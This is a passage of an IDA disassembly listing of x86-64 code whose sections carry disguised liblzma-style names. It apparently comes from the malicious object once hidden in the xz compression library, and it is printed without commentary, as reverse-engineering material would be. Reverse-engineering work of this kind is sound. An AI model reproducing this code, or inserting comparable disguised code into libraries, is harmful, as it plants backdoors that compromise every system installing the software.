.text.auto_decoder_inia:00000000000070D4                 cmp     qword ptr [rcx+48h], 0
.text.auto_decoder_inia:00000000000070D9                 jz      short loc_70CE
.text.auto_decoder_inia:00000000000070DB                 cmp     qword ptr [rcx+50h], 0
.text.auto_decoder_inia:00000000000070E0                 jz      short loc_70CE
.text.auto_decoder_inia:00000000000070E2                 mov     r12, rsi
.text.auto_decoder_inia:00000000000070E5                 mov     rbp, rdx
.text.auto_decoder_inia:00000000000070E8                 mov     r14, rdx
.text.auto_decoder_inia:00000000000070EB
.text.auto_decoder_inia:00000000000070EB loc_70EB:                               ; CODE XREF: sub_70B0+52↓j
.text.auto_decoder_inia:00000000000070EB                                         ; sub_70B0+5E↓j
.text.auto_decoder_inia:00000000000070EB                 mov     rdx, r14
.text.auto_decoder_inia:00000000000070EE                 mov     rsi, r12
.text.auto_decoder_inia:00000000000070F1                 mov     edi, r13d
.text.auto_decoder_inia:00000000000070F4                 call    qword ptr [rbx+48h]
.text.auto_decoder_inia:00000000000070F7                 test    rax, rax
.text.auto_decoder_inia:00000000000070FA                 jns     short loc_7106
.text.auto_decoder_inia:00000000000070FC                 call    qword ptr [rbx+50h]
.text.auto_decoder_inia:00000000000070FF                 cmp     dword ptr [rax], 4
.text.auto_decoder_inia:0000000000007102                 jz      short loc_70EB
.text.auto_decoder_inia:0000000000007104                 jmp     short loc_70CE
.text.auto_decoder_inia:0000000000007106 ; ---------------------------------------------------------------------------
.text.auto_decoder_inia:0000000000007106
.text.auto_decoder_inia:0000000000007106 loc_7106:                               ; CODE XREF: sub_70B0+4A↑j
.text.auto_decoder_inia:0000000000007106                 jz      short loc_70CE
.text.auto_decoder_inia:0000000000007108                 add     r12, rax
.text.auto_decoder_inia:000000000000710B                 sub     r14, rax
.text.auto_decoder_inia:000000000000710E                 jnz     short loc_70EB
.text.auto_decoder_inia:0000000000007110                 mov     rax, rbp
.text.auto_decoder_inia:0000000000007113
.text.auto_decoder_inia:0000000000007113 loc_7113:                               ; CODE XREF: sub_70B0+22↑j
.text.auto_decoder_inia:0000000000007113                 pop     rbx
.text.auto_decoder_inia:0000000000007114                 pop     rbp
.text.auto_decoder_inia:0000000000007115                 pop     r12
.text.auto_decoder_inia:0000000000007117                 pop     r13
.text.auto_decoder_inia:0000000000007119                 pop     r14
.text.auto_decoder_inia:000000000000711B                 retn
.text.auto_decoder_inia:000000000000711C ; ---------------------------------------------------------------------------
.text.auto_decoder_inia:000000000000711C
.text.auto_decoder_inia:000000000000711C locret_711C:                            ; CODE XREF: sub_70B0+5↑j
.text.auto_decoder_inia:000000000000711C                 retn
.text.auto_decoder_inia:000000000000711C sub_70B0        endp
.text.auto_decoder_inia:000000000000711C
.text.auto_decoder_inia:000000000000711C _text_auto_decoder_inia ends
.text.auto_decoder_inia:000000000000711C
.text.bt_find_funa:0000000000007120 ; ===========================================================================
.text.bt_find_funa:0000000000007120
.text.bt_find_funa:0000000000007120 ; Segment type: Pure code
.text.bt_find_funa:0000000000007120 ; Segment permissions: Read/Execute
.text.bt_find_funa:0000000000007120 _text_bt_find_funa segment para public 'CODE' use64
.text.bt_find_funa:0000000000007120                 assume cs:_text_bt_find_funa
.text.bt_find_funa:0000000000007120                 ;org 7120h
.text.bt_find_funa:0000000000007120                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.bt_find_funa:0000000000007120
.text.bt_find_funa:0000000000007120 ; =============== S U B R O U T I N E =======================================
.text.bt_find_funa:0000000000007120
.text.bt_find_funa:0000000000007120
.text.bt_find_funa:0000000000007120 ; __int64 __fastcall sub_7120(int, __int64, __int64, __int64)
.text.bt_find_funa:0000000000007120 sub_7120        proc near               ; CODE XREF: _Lbt_skip_func_part_0+42↓p
.text.bt_find_funa:0000000000007120                                         ; _Llzma_code_part_1:loc_81D2↓p ...
.text.bt_find_funa:0000000000007120                 xor     eax, eax
.text.bt_find_funa:0000000000007122                 test    rdx, rdx
.text.bt_find_funa:0000000000007125                 jz      short locret_7197
.text.bt_find_funa:0000000000007127                 push    r14
.text.bt_find_funa:0000000000007129                 mov     r14d, edi
.text.bt_find_funa:000000000000712C                 push    r13
.text.bt_find_funa:000000000000712E                 push    r12
.text.bt_find_funa:0000000000007130                 mov     r12, rdx
.text.bt_find_funa:0000000000007133                 mov     edx, edi
.text.bt_find_funa:0000000000007135                 shr     edx, 1Fh
.text.bt_find_funa:0000000000007138                 test    rcx, rcx
.text.bt_find_funa:000000000000713B                 push    rbp
.text.bt_find_funa:000000000000713C                 setz    al
.text.bt_find_funa:000000000000713F                 push    rbx
.text.bt_find_funa:0000000000007140                 mov     rbx, rcx
.text.bt_find_funa:0000000000007143                 or      al, dl
.text.bt_find_funa:0000000000007145                 jnz     short loc_714F
.text.bt_find_funa:0000000000007147                 mov     rbp, rsi
.text.bt_find_funa:000000000000714A                 test    rsi, rsi
.text.bt_find_funa:000000000000714D                 jnz     short loc_7155
.text.bt_find_funa:000000000000714F
.text.bt_find_funa:000000000000714F loc_714F:                               ; CODE XREF: sub_7120+25↑j
.text.bt_find_funa:000000000000714F                                         ; sub_7120+3A↓j ...
.text.bt_find_funa:000000000000714F                 or      rax, 0FFFFFFFFFFFFFFFFh
.text.bt_find_funa:0000000000007153                 jmp     short loc_718E
.text.bt_find_funa:0000000000007155 ; ---------------------------------------------------------------------------
.text.bt_find_funa:0000000000007155
.text.bt_find_funa:0000000000007155 loc_7155:                               ; CODE XREF: sub_7120+2D↑j
.text.bt_find_funa:0000000000007155                 cmp     qword ptr [rcx+38h], 0
.text.bt_find_funa:000000000000715A                 jz      short loc_714F
.text.bt_find_funa:000000000000715C                 cmp     qword ptr [rcx+50h], 0
.text.bt_find_funa:0000000000007161                 jz      short loc_714F
.text.bt_find_funa:0000000000007163                 mov     r13, r12
.text.bt_find_funa:0000000000007166
.text.bt_find_funa:0000000000007166 loc_7166:                               ; CODE XREF: sub_7120+5D↓j
.text.bt_find_funa:0000000000007166                                         ; sub_7120+69↓j
.text.bt_find_funa:0000000000007166                 mov     rdx, r13
.text.bt_find_funa:0000000000007169                 mov     rsi, rbp
.text.bt_find_funa:000000000000716C                 mov     edi, r14d
.text.bt_find_funa:000000000000716F                 call    qword ptr [rbx+38h]
.text.bt_find_funa:0000000000007172                 test    rax, rax
.text.bt_find_funa:0000000000007175                 jns     short loc_7181
.text.bt_find_funa:0000000000007177                 call    qword ptr [rbx+50h]
.text.bt_find_funa:000000000000717A                 cmp     dword ptr [rax], 4
.text.bt_find_funa:000000000000717D                 jz      short loc_7166
.text.bt_find_funa:000000000000717F                 jmp     short loc_714F
.text.bt_find_funa:0000000000007181 ; ---------------------------------------------------------------------------
.text.bt_find_funa:0000000000007181
.text.bt_find_funa:0000000000007181 loc_7181:                               ; CODE XREF: sub_7120+55↑j
.text.bt_find_funa:0000000000007181                 jz      short loc_714F
.text.bt_find_funa:0000000000007183                 add     rbp, rax
.text.bt_find_funa:0000000000007186                 sub     r13, rax
.text.bt_find_funa:0000000000007189                 jnz     short loc_7166
.text.bt_find_funa:000000000000718B                 mov     rax, r12
.text.bt_find_funa:000000000000718E
.text.bt_find_funa:000000000000718E loc_718E:                               ; CODE XREF: sub_7120+33↑j
.text.bt_find_funa:000000000000718E                 pop     rbx
.text.bt_find_funa:000000000000718F                 pop     rbp
.text.bt_find_funa:0000000000007190                 pop     r12
.text.bt_find_funa:0000000000007192                 pop     r13
.text.bt_find_funa:0000000000007194                 pop     r14
.text.bt_find_funa:0000000000007196                 retn
.text.bt_find_funa:0000000000007197 ; ---------------------------------------------------------------------------
.text.bt_find_funa:0000000000007197
.text.bt_find_funa:0000000000007197 locret_7197:                            ; CODE XREF: sub_7120+5↑j
.text.bt_find_funa:0000000000007197                 retn
.text.bt_find_funa:0000000000007197 sub_7120        endp
.text.bt_find_funa:0000000000007197
.text.bt_find_funa:0000000000007197 ; ---------------------------------------------------------------------------
.text.bt_find_funa:0000000000007198                 align 20h
.text.bt_find_funa:00000000000071A0
.text.bt_find_funa:00000000000071A0 ; =============== S U B R O U T I N E =======================================
.text.bt_find_funa:00000000000071A0
.text.bt_find_funa:00000000000071A0
.text.bt_find_funa:00000000000071A0 ; __int64 __fastcall sub_71A0(__int64, unsigned int)
.text.bt_find_funa:00000000000071A0 sub_71A0        proc near               ; CODE XREF: sub_71C0+52↓p
.text.bt_find_funa:00000000000071A0                                         ; sub_7660+233↓p ...
.text.bt_find_funa:00000000000071A0                 xor     eax, eax
.text.bt_find_funa:00000000000071A2
.text.bt_find_funa:00000000000071A2 loc_71A2:                               ; CODE XREF: sub_71A0+F↓j
.text.bt_find_funa:00000000000071A2                 cmp     eax, esi
.text.bt_find_funa:00000000000071A4                 jnb     short loc_71B7
.text.bt_find_funa:00000000000071A6                 inc     rax
.text.bt_find_funa:00000000000071A9                 cmp     qword ptr [rdi+rax*8-8], 0
.text.bt_find_funa:00000000000071AF                 jnz     short loc_71A2
.text.bt_find_funa:00000000000071B1                 mov     eax, 1
.text.bt_find_funa:00000000000071B6                 retn
.text.bt_find_funa:00000000000071B7 ; ---------------------------------------------------------------------------
.text.bt_find_funa:00000000000071B7
.text.bt_find_funa:00000000000071B7 loc_71B7:                               ; CODE XREF: sub_71A0+4↑j
.text.bt_find_funa:00000000000071B7                 xor     eax, eax
.text.bt_find_funa:00000000000071B9                 retn
.text.bt_find_funa:00000000000071B9 sub_71A0        endp
.text.bt_find_funa:00000000000071B9
.text.bt_find_funa:00000000000071B9 _text_bt_find_funa ends
.text.bt_find_funa:00000000000071B9
.text.lzma_delta_encoder_inia:00000000000071C0 ; ===========================================================================
.text.lzma_delta_encoder_inia:00000000000071C0
.text.lzma_delta_encoder_inia:00000000000071C0 ; Segment type: Pure code
.text.lzma_delta_encoder_inia:00000000000071C0 ; Segment permissions: Read/Execute
.text.lzma_delta_encoder_inia:00000000000071C0 _text_lzma_delta_encoder_inia segment para public 'CODE' use64
.text.lzma_delta_encoder_inia:00000000000071C0                 assume cs:_text_lzma_delta_encoder_inia
.text.lzma_delta_encoder_inia:00000000000071C0                 ;org 71C0h
.text.lzma_delta_encoder_inia:00000000000071C0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_delta_encoder_inia:00000000000071C0
.text.lzma_delta_encoder_inia:00000000000071C0 ; =============== S U B R O U T I N E =======================================
.text.lzma_delta_encoder_inia:00000000000071C0
.text.lzma_delta_encoder_inia:00000000000071C0
.text.lzma_delta_encoder_inia:00000000000071C0 ; __int64 __fastcall sub_71C0(__int64, unsigned int, __int64, __int64, __int64, __int64)
.text.lzma_delta_encoder_inia:00000000000071C0 sub_71C0        proc near               ; CODE XREF: _Lparse_lzma12_0+5E↓p
.text.lzma_delta_encoder_inia:00000000000071C0                                         ; _Lparse_lzma12_0+82↓p ...
.text.lzma_delta_encoder_inia:00000000000071C0
.text.lzma_delta_encoder_inia:00000000000071C0 var_58          = qword ptr -58h
.text.lzma_delta_encoder_inia:00000000000071C0 var_50          = qword ptr -50h
.text.lzma_delta_encoder_inia:00000000000071C0 var_3C          = dword ptr -3Ch
.text.lzma_delta_encoder_inia:00000000000071C0
.text.lzma_delta_encoder_inia:00000000000071C0                 push    r15
.text.lzma_delta_encoder_inia:00000000000071C2                 xor     eax, eax
.text.lzma_delta_encoder_inia:00000000000071C4                 push    r14
.text.lzma_delta_encoder_inia:00000000000071C6                 push    r13
.text.lzma_delta_encoder_inia:00000000000071C8                 push    r12
.text.lzma_delta_encoder_inia:00000000000071CA                 push    rbp
.text.lzma_delta_encoder_inia:00000000000071CB                 push    rbx
.text.lzma_delta_encoder_inia:00000000000071CC                 sub     rsp, 28h
.text.lzma_delta_encoder_inia:00000000000071D0                 mov     [rsp+58h+var_58], rdx
.text.lzma_delta_encoder_inia:00000000000071D4                 mov     [rsp+58h+var_3C], eax
.text.lzma_delta_encoder_inia:00000000000071D8                 test    rdi, rdi
.text.lzma_delta_encoder_inia:00000000000071DB                 jz      short loc_71E4
.text.lzma_delta_encoder_inia:00000000000071DD                 mov     r12d, esi
.text.lzma_delta_encoder_inia:00000000000071E0                 test    esi, esi
.text.lzma_delta_encoder_inia:00000000000071E2                 jnz     short loc_71EB
.text.lzma_delta_encoder_inia:00000000000071E4
.text.lzma_delta_encoder_inia:00000000000071E4 loc_71E4:                               ; CODE XREF: sub_71C0+1B↑j
.text.lzma_delta_encoder_inia:00000000000071E4                                         ; sub_71C0+31↓j ...
.text.lzma_delta_encoder_inia:00000000000071E4                 xor     ebp, ebp
.text.lzma_delta_encoder_inia:00000000000071E6                 jmp     loc_72CE
.text.lzma_delta_encoder_inia:00000000000071EB ; ---------------------------------------------------------------------------
.text.lzma_delta_encoder_inia:00000000000071EB
.text.lzma_delta_encoder_inia:00000000000071EB loc_71EB:                               ; CODE XREF: sub_71C0+22↑j
.text.lzma_delta_encoder_inia:00000000000071EB                 mov     r14, rcx
.text.lzma_delta_encoder_inia:00000000000071EE                 test    rcx, rcx
.text.lzma_delta_encoder_inia:00000000000071F1                 jz      short loc_71E4
.text.lzma_delta_encoder_inia:00000000000071F3                 mov     rbp, r8
.text.lzma_delta_encoder_inia:00000000000071F6                 test    r8, r8
.text.lzma_delta_encoder_inia:00000000000071F9                 jz      short loc_71E4
.text.lzma_delta_encoder_inia:00000000000071FB                 mov     r15, r9
.text.lzma_delta_encoder_inia:00000000000071FE                 test    r9, r9
.text.lzma_delta_encoder_inia:0000000000007201                 jz      short loc_71E4
.text.lzma_delta_encoder_inia:0000000000007203                 mov     r13, rdi
.text.lzma_delta_encoder_inia:0000000000007206                 mov     esi, 6
.text.lzma_delta_encoder_inia:000000000000720B                 lea     rdi, [r9+0A0h]
.text.lzma_delta_encoder_inia:0000000000007212                 call    sub_71A0
.text.lzma_delta_encoder_inia:0000000000007217                 test    eax, eax
.text.lzma_delta_encoder_inia:0000000000007219                 jnz     short loc_71E4
.text.lzma_delta_encoder_inia:000000000000721B                 call    qword ptr [r9+0A0h]
.text.lzma_delta_encoder_inia:0000000000007222                 mov     rbx, rax
.text.lzma_delta_encoder_inia:0000000000007225                 test    rax, rax
.text.lzma_delta_encoder_inia:0000000000007228                 jz      short loc_71E4
.text.lzma_delta_encoder_inia:000000000000722A                 mov     r10, [r15+0A8h]
.text.lzma_delta_encoder_inia:0000000000007231                 mov     [rsp+58h+var_50], r10
.text.lzma_delta_encoder_inia:0000000000007236                 call    qword ptr [r15+0C8h]
.text.lzma_delta_encoder_inia:000000000000723D                 xor     edx, edx
.text.lzma_delta_encoder_inia:000000000000723F                 mov     rcx, [rsp+58h+var_58]
.text.lzma_delta_encoder_inia:0000000000007243                 mov     r8, r14
.text.lzma_delta_encoder_inia:0000000000007246                 mov     r10, [rsp+58h+var_50]
.text.lzma_delta_encoder_inia:000000000000724B                 mov     rsi, rax
.text.lzma_delta_encoder_inia:000000000000724E                 mov     rdi, rbx
.text.lzma_delta_encoder_inia:0000000000007251                 call    r10
.text.lzma_delta_encoder_inia:0000000000007254                 dec     eax
.text.lzma_delta_encoder_inia:0000000000007256                 jnz     short loc_72B4
.text.lzma_delta_encoder_inia:0000000000007258                 lea     r14, [rsp+58h+var_3C]
.text.lzma_delta_encoder_inia:000000000000725D                 mov     r8d, r12d
.text.lzma_delta_encoder_inia:0000000000007260                 mov     rcx, r13
.text.lzma_delta_encoder_inia:0000000000007263                 mov     rsi, rbp
.text.lzma_delta_encoder_inia:0000000000007266                 mov     rdx, r14
.text.lzma_delta_encoder_inia:0000000000007269                 mov     rdi, rbx
.text.lzma_delta_encoder_inia:000000000000726C                 call    qword ptr [r15+0B0h]
.text.lzma_delta_encoder_inia:0000000000007273                 dec     eax
.text.lzma_delta_encoder_inia:0000000000007275                 jnz     short loc_72B4
.text.lzma_delta_encoder_inia:0000000000007277                 movsxd  rax, [rsp+58h+var_3C]
.text.lzma_delta_encoder_inia:000000000000727C                 test    eax, eax
.text.lzma_delta_encoder_inia:000000000000727E                 js      short loc_72B4
.text.lzma_delta_encoder_inia:0000000000007280                 lea     rsi, [rbp+rax+0]
.text.lzma_delta_encoder_inia:0000000000007285                 mov     rdx, r14
.text.lzma_delta_encoder_inia:0000000000007288                 mov     rdi, rbx
.text.lzma_delta_encoder_inia:000000000000728B                 call    qword ptr [r15+0B8h]
.text.lzma_delta_encoder_inia:0000000000007292                 mov     ebp, eax
.text.lzma_delta_encoder_inia:0000000000007294                 cmp     eax, 1
.text.lzma_delta_encoder_inia:0000000000007297                 jnz     short loc_72B4
.text.lzma_delta_encoder_inia:0000000000007299                 mov     eax, [rsp+58h+var_3C]
.text.lzma_delta_encoder_inia:000000000000729D                 mov     rdx, [r15+0C0h]
.text.lzma_delta_encoder_inia:00000000000072A4                 test    eax, eax
.text.lzma_delta_encoder_inia:00000000000072A6                 js      short loc_72B4
.text.lzma_delta_encoder_inia:00000000000072A8                 cmp     r12d, eax
.text.lzma_delta_encoder_inia:00000000000072AB                 jb      short loc_72B4
.text.lzma_delta_encoder_inia:00000000000072AD                 mov     rdi, rbx
.text.lzma_delta_encoder_inia:00000000000072B0                 call    rdx
.text.lzma_delta_encoder_inia:00000000000072B2                 jmp     short loc_72CE
.text.lzma_delta_encoder_inia:00000000000072B4 ; ---------------------------------------------------------------------------
.text.lzma_delta_encoder_inia:00000000000072B4
.text.lzma_delta_encoder_inia:00000000000072B4 loc_72B4:                               ; CODE XREF: sub_71C0+96↑j
.text.lzma_delta_encoder_inia:00000000000072B4                                         ; sub_71C0+B5↑j ...
.text.lzma_delta_encoder_inia:00000000000072B4                 mov     rax, [r15+0C0h]
.text.lzma_delta_encoder_inia:00000000000072BB                 test    rax, rax
.text.lzma_delta_encoder_inia:00000000000072BE                 jz      loc_71E4
.text.lzma_delta_encoder_inia:00000000000072C4                 mov     rdi, rbx
.text.lzma_delta_encoder_inia:00000000000072C7                 call    rax
.text.lzma_delta_encoder_inia:00000000000072C9                 jmp     loc_71E4
.text.lzma_delta_encoder_inia:00000000000072CE ; ---------------------------------------------------------------------------
.text.lzma_delta_encoder_inia:00000000000072CE
.text.lzma_delta_encoder_inia:00000000000072CE loc_72CE:                               ; CODE XREF: sub_71C0+26↑j
.text.lzma_delta_encoder_inia:00000000000072CE                                         ; sub_71C0+F2↑j
.text.lzma_delta_encoder_inia:00000000000072CE                 add     rsp, 28h
.text.lzma_delta_encoder_inia:00000000000072D2                 mov     eax, ebp
.text.lzma_delta_encoder_inia:00000000000072D4                 pop     rbx
.text.lzma_delta_encoder_inia:00000000000072D5                 pop     rbp
.text.lzma_delta_encoder_inia:00000000000072D6                 pop     r12
.text.lzma_delta_encoder_inia:00000000000072D8                 pop     r13
.text.lzma_delta_encoder_inia:00000000000072DA                 pop     r14
.text.lzma_delta_encoder_inia:00000000000072DC                 pop     r15
.text.lzma_delta_encoder_inia:00000000000072DE                 retn
.text.lzma_delta_encoder_inia:00000000000072DE sub_71C0        endp
.text.lzma_delta_encoder_inia:00000000000072DE
.text.lzma_delta_encoder_inia:00000000000072DE _text_lzma_delta_encoder_inia ends
.text.lzma_delta_encoder_inia:00000000000072DE
.text.lzma_easy_encodea:00000000000072E0 ; ===========================================================================
.text.lzma_easy_encodea:00000000000072E0
.text.lzma_easy_encodea:00000000000072E0 ; Segment type: Pure code
.text.lzma_easy_encodea:00000000000072E0 ; Segment permissions: Read/Execute
.text.lzma_easy_encodea:00000000000072E0 _text_lzma_easy_encodea segment para public 'CODE' use64
.text.lzma_easy_encodea:00000000000072E0                 assume cs:_text_lzma_easy_encodea
.text.lzma_easy_encodea:00000000000072E0                 ;org 72E0h
.text.lzma_easy_encodea:00000000000072E0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_easy_encodea:00000000000072E0
.text.lzma_easy_encodea:00000000000072E0 ; =============== S U B R O U T I N E =======================================
.text.lzma_easy_encodea:00000000000072E0
.text.lzma_easy_encodea:00000000000072E0
.text.lzma_easy_encodea:00000000000072E0 ; _BOOL8 __fastcall sub_72E0(__int64, __int64, __int64, unsigned __int64, __int64)
.text.lzma_easy_encodea:00000000000072E0 sub_72E0        proc near               ; CODE XREF: sub_3B70+13B↑p
.text.lzma_easy_encodea:00000000000072E0                                         ; sub_7540+100↓p ...
.text.lzma_easy_encodea:00000000000072E0
.text.lzma_easy_encodea:00000000000072E0 var_28          = qword ptr -28h
.text.lzma_easy_encodea:00000000000072E0 var_20          = qword ptr -20h
.text.lzma_easy_encodea:00000000000072E0
.text.lzma_easy_encodea:00000000000072E0                 push    r13
.text.lzma_easy_encodea:00000000000072E2                 push    r12
.text.lzma_easy_encodea:00000000000072E4                 sub     rsp, 18h
.text.lzma_easy_encodea:00000000000072E8                 test    rdi, rdi
.text.lzma_easy_encodea:00000000000072EB                 mov     [rsp+28h+var_20], rdi
.text.lzma_easy_encodea:00000000000072F0                 jz      short loc_7343
.text.lzma_easy_encodea:00000000000072F2                 test    rsi, rsi
.text.lzma_easy_encodea:00000000000072F5                 mov     [rsp+28h+var_28], rsi
.text.lzma_easy_encodea:00000000000072F9                 jz      short loc_7343
.text.lzma_easy_encodea:00000000000072FB                 cmp     rcx, 1Fh
.text.lzma_easy_encodea:00000000000072FF                 jbe     short loc_7343
.text.lzma_easy_encodea:0000000000007301                 test    r8, r8
.text.lzma_easy_encodea:0000000000007304                 jz      short loc_7343
.text.lzma_easy_encodea:0000000000007306                 mov     r13, [r8+0F0h]
.text.lzma_easy_encodea:000000000000730D                 xor     eax, eax
.text.lzma_easy_encodea:000000000000730F                 test    r13, r13
.text.lzma_easy_encodea:0000000000007312                 jz      short loc_7345
.text.lzma_easy_encodea:0000000000007314                 mov     r12, rdx
.text.lzma_easy_encodea:0000000000007317                 mov     rdx, [r8+58h]
.text.lzma_easy_encodea:000000000000731B                 test    rdx, rdx
.text.lzma_easy_encodea:000000000000731E                 jz      short loc_7345
.text.lzma_easy_encodea:0000000000007320                 call    rdx
.text.lzma_easy_encodea:0000000000007322                 xor     r9d, r9d
.text.lzma_easy_encodea:0000000000007325                 xor     ecx, ecx
.text.lzma_easy_encodea:0000000000007327                 mov     rsi, [rsp+28h+var_28]
.text.lzma_easy_encodea:000000000000732B                 mov     rdi, [rsp+28h+var_20]
.text.lzma_easy_encodea:0000000000007330                 mov     r8, rax
.text.lzma_easy_encodea:0000000000007333                 mov     rdx, r12
.text.lzma_easy_encodea:0000000000007336                 call    r13
.text.lzma_easy_encodea:0000000000007339                 dec     eax
.text.lzma_easy_encodea:000000000000733B                 setz    al
.text.lzma_easy_encodea:000000000000733E                 movzx   eax, al
.text.lzma_easy_encodea:0000000000007341                 jmp     short loc_7345
.text.lzma_easy_encodea:0000000000007343 ; ---------------------------------------------------------------------------
.text.lzma_easy_encodea:0000000000007343
.text.lzma_easy_encodea:0000000000007343 loc_7343:                               ; CODE XREF: sub_72E0+10↑j
.text.lzma_easy_encodea:0000000000007343                                         ; sub_72E0+19↑j ...
.text.lzma_easy_encodea:0000000000007343                 xor     eax, eax
.text.lzma_easy_encodea:0000000000007345
.text.lzma_easy_encodea:0000000000007345 loc_7345:                               ; CODE XREF: sub_72E0+32↑j
.text.lzma_easy_encodea:0000000000007345                                         ; sub_72E0+3E↑j ...
.text.lzma_easy_encodea:0000000000007345                 add     rsp, 18h
.text.lzma_easy_encodea:0000000000007349                 pop     r12
.text.lzma_easy_encodea:000000000000734B                 pop     r13
.text.lzma_easy_encodea:000000000000734D                 retn
.text.lzma_easy_encodea:000000000000734D sub_72E0        endp
.text.lzma_easy_encodea:000000000000734D
.text.lzma_easy_encodea:000000000000734D _text_lzma_easy_encodea ends
.text.lzma_easy_encodea:000000000000734D
.text.lzma_block_decoder_inia:0000000000007350 ; ===========================================================================
.text.lzma_block_decoder_inia:0000000000007350
.text.lzma_block_decoder_inia:0000000000007350 ; Segment type: Pure code
.text.lzma_block_decoder_inia:0000000000007350 ; Segment permissions: Read/Execute
.text.lzma_block_decoder_inia:0000000000007350 _text_lzma_block_decoder_inia segment para public 'CODE' use64
.text.lzma_block_decoder_inia:0000000000007350                 assume cs:_text_lzma_block_decoder_inia
.text.lzma_block_decoder_inia:0000000000007350                 ;org 7350h
.text.lzma_block_decoder_inia:0000000000007350                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_block_decoder_inia:0000000000007350
.text.lzma_block_decoder_inia:0000000000007350 ; =============== S U B R O U T I N E =======================================
.text.lzma_block_decoder_inia:0000000000007350
.text.lzma_block_decoder_inia:0000000000007350
.text.lzma_block_decoder_inia:0000000000007350 ; __int64 __fastcall sub_7350(__int64, unsigned __int64, _QWORD *, __int64, __int64)
.text.lzma_block_decoder_inia:0000000000007350 sub_7350        proc near               ; CODE XREF: sub_3B70+101↑p
.text.lzma_block_decoder_inia:0000000000007350                                         ; sub_7540+A4↓p ...
.text.lzma_block_decoder_inia:0000000000007350
.text.lzma_block_decoder_inia:0000000000007350 var_40          = qword ptr -40h
.text.lzma_block_decoder_inia:0000000000007350
.text.lzma_block_decoder_inia:0000000000007350                 push    r15
.text.lzma_block_decoder_inia:0000000000007352                 push    r14
.text.lzma_block_decoder_inia:0000000000007354                 push    r13
.text.lzma_block_decoder_inia:0000000000007356                 push    r12
.text.lzma_block_decoder_inia:0000000000007358                 mov     r12, rdx
.text.lzma_block_decoder_inia:000000000000735B                 push    rbp
.text.lzma_block_decoder_inia:000000000000735C                 push    rbx
.text.lzma_block_decoder_inia:000000000000735D                 sub     rsp, 18h
.text.lzma_block_decoder_inia:0000000000007361                 test    r8, r8
.text.lzma_block_decoder_inia:0000000000007364                 setz    al
.text.lzma_block_decoder_inia:0000000000007367                 cmp     rsi, 5
.text.lzma_block_decoder_inia:000000000000736B                 setbe   dl
.text.lzma_block_decoder_inia:000000000000736E                 or      al, dl
.text.lzma_block_decoder_inia:0000000000007370                 jnz     short loc_737D
.text.lzma_block_decoder_inia:0000000000007372                 mov     r13, rdi
.text.lzma_block_decoder_inia:0000000000007375                 mov     rdi, rcx
.text.lzma_block_decoder_inia:0000000000007378                 test    rcx, rcx
.text.lzma_block_decoder_inia:000000000000737B                 jnz     short loc_7384
.text.lzma_block_decoder_inia:000000000000737D
.text.lzma_block_decoder_inia:000000000000737D loc_737D:                               ; CODE XREF: sub_7350+20↑j
.text.lzma_block_decoder_inia:000000000000737D                                         ; sub_7350+3F↓j ...
.text.lzma_block_decoder_inia:000000000000737D                 xor     eax, eax
.text.lzma_block_decoder_inia:000000000000737F                 jmp     loc_7415
.text.lzma_block_decoder_inia:0000000000007384 ; ---------------------------------------------------------------------------
.text.lzma_block_decoder_inia:0000000000007384
.text.lzma_block_decoder_inia:0000000000007384 loc_7384:                               ; CODE XREF: sub_7350+2B↑j
.text.lzma_block_decoder_inia:0000000000007384                 cmp     qword ptr [r8+100h], 0
.text.lzma_block_decoder_inia:000000000000738C                 mov     r14, r8
.text.lzma_block_decoder_inia:000000000000738F                 jz      short loc_737D
.text.lzma_block_decoder_inia:0000000000007391                 xor     eax, eax
.text.lzma_block_decoder_inia:0000000000007393                 mov     [r12], rax
.text.lzma_block_decoder_inia:0000000000007397                 mov     rax, [r8+68h]
.text.lzma_block_decoder_inia:000000000000739B                 test    rax, rax
.text.lzma_block_decoder_inia:000000000000739E                 jz      short loc_737D
.text.lzma_block_decoder_inia:00000000000073A0                 mov     [rsp+48h+var_40], rcx
.text.lzma_block_decoder_inia:00000000000073A5                 mov     r15, rsi
.text.lzma_block_decoder_inia:00000000000073A8                 call    rax
.text.lzma_block_decoder_inia:00000000000073AA                 mov     ebx, eax
.text.lzma_block_decoder_inia:00000000000073AC                 cmp     eax, 4000h
.text.lzma_block_decoder_inia:00000000000073B1                 ja      short loc_737D
.text.lzma_block_decoder_inia:00000000000073B3                 add     ebx, 7
.text.lzma_block_decoder_inia:00000000000073B6                 shr     ebx, 3
.text.lzma_block_decoder_inia:00000000000073B9                 jz      short loc_737D
.text.lzma_block_decoder_inia:00000000000073BB                 mov     ebp, ebx
.text.lzma_block_decoder_inia:00000000000073BD                 sub     r15, 6
.text.lzma_block_decoder_inia:00000000000073C1                 cmp     r15, rbp
.text.lzma_block_decoder_inia:00000000000073C4                 jb      short loc_737D
.text.lzma_block_decoder_inia:00000000000073C6                 lea     r15, [r13+5]
.text.lzma_block_decoder_inia:00000000000073CA                 mov     byte ptr [r13+4], 0
.text.lzma_block_decoder_inia:00000000000073CF                 mov     rdi, [rsp+48h+var_40]
.text.lzma_block_decoder_inia:00000000000073D4                 mov     rsi, r15
.text.lzma_block_decoder_inia:00000000000073D7                 call    qword ptr [r14+100h]
.text.lzma_block_decoder_inia:00000000000073DE                 cdqe
.text.lzma_block_decoder_inia:00000000000073E0                 cmp     rax, rbp
.text.lzma_block_decoder_inia:00000000000073E3                 jnz     short loc_737D
.text.lzma_block_decoder_inia:00000000000073E5                 cmp     byte ptr [r13+5], 0
.text.lzma_block_decoder_inia:00000000000073EA                 jns     short loc_73F3
.text.lzma_block_decoder_inia:00000000000073EC                 inc     rbp
.text.lzma_block_decoder_inia:00000000000073EF                 inc     ebx
.text.lzma_block_decoder_inia:00000000000073F1                 jmp     short loc_7402
.text.lzma_block_decoder_inia:00000000000073F3 ; ---------------------------------------------------------------------------
.text.lzma_block_decoder_inia:00000000000073F3
.text.lzma_block_decoder_inia:00000000000073F3 loc_73F3:                               ; CODE XREF: sub_7350+9A↑j
.text.lzma_block_decoder_inia:00000000000073F3                 lea     rdi, [r13+4]
.text.lzma_block_decoder_inia:00000000000073F7                 mov     rdx, rbp
.text.lzma_block_decoder_inia:00000000000073FA                 mov     rsi, r15
.text.lzma_block_decoder_inia:00000000000073FD                 call    sub_1B20
.text.lzma_block_decoder_inia:0000000000007402
